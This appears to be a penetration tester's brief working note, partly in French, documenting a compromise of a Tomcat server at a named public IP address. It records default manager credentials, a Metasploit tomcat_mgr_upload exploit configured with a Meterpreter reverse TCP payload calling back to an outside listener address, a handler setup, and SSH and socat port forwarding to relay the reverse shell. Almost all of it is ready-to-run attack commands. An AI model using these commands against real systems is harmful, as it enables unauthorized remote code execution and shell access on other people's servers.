NMAP

```
18.158.110.24
```

## Port 8080

```
tomcat:password
```

Sur exegol:

```
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 18.158.110.24
set RPORT 8080

set HttpUsername tomcat
set HttpPassword password

set payload java/meterpreter/reverse_tcp

set LPORT 6667
set ReverseListenerBindAddress 0.0.0.0  
set LHOST 212.129.9.19

exploit
```

```
use exploit/multi/handler  
set payload java/meterpreter/reverse_tcp  
set LHOST 0.0.0.0  
set LPORT 4444  
run
```

Sur pentest echo:

```
ssh -R 6666:127.0.0.1:4444 echo
socat TCP-LISTEN:6667,fork TCP:127.0.0.1:6666
neo iptables open 6667
```

![[Pasted image 20260410145621.png]]

